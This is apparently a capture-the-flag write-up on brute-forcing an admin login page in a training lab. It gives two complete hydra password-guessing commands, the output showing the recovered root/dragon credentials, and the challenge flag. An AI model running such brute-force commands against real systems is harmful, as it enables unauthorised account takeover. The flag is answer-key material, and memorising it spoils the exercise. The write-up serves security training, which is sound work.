# Bruteforce Admin Credentials

## Flag

d19b4823e0d5600ceed56d5e896ef328d7a2b9e7ac7e80f4fcdb9b10bcb3e7ff

## Description

In the "Numeric SQL Injection" episode, we noticed an admin table with "Member_BruteForce" as schema name.

## URL

http://192.168.x.y/admin/

## Steps To Reproduce

Two "basic" payload with common admin usernames :
hydra -t 64 -l admin -P 1000-most-common-passwords.txt 192.168.x.y http-post-form '/admin/:username=^USER^&password=^PASS^&Login=Login:Wrong'
hydra -t 64 -l root -P 1000-most-common-passwords.txt 192.168.x.y http-post-form '/admin/:username=^USER^&password=^PASS^&Login=Login:Wrong'

With the second payload :
[80][http-post-form] host: 192.168.x.y login: root password: dragon
hydra, dragon, haha... ==>[]
So we login with root/dragon as credentials.

## Why is it dangerous ?

Any attacker can impersonate an admin user.

## Possible fixes

- Choose a secure password.

## Resources

- [1000-most-common-passwords.txt]()
- https://redteamtutorials.com/2018/10/25/hydra-brute-force-https/
